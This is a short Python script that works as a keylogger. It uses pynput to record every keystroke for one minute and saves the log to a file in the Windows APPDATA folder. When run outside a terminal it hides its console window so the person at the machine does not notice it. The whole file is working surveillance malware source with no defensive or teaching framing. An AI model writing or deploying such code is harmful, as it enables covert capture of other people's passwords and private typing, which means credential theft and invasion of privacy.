import pynput.keyboard
import time
import os
import sys

def run():
    log = []

    def on_press(key):
        try:
            log.append(key.char)
        except AttributeError:
            log.append(f"[{key}]")

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    # Capture keystrokes for a set amount of time
    time.sleep(60)  # 1 minute
    listener.stop()

    log_data = ''.join(log)

    # Save the log to a file in the user's AppData folder
    log_file = os.path.join(os.getenv('APPDATA'), 'keylogger_output.txt')
    with open(log_file, 'w') as file:
        file.write(log_data)

    return log_file

if __name__ == "__main__":
    # Hide the console window (for running outside of terminal)
    if not sys.stdout.isatty():
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            ctypes.windll.kernel32.CloseHandle(whnd)

    run()

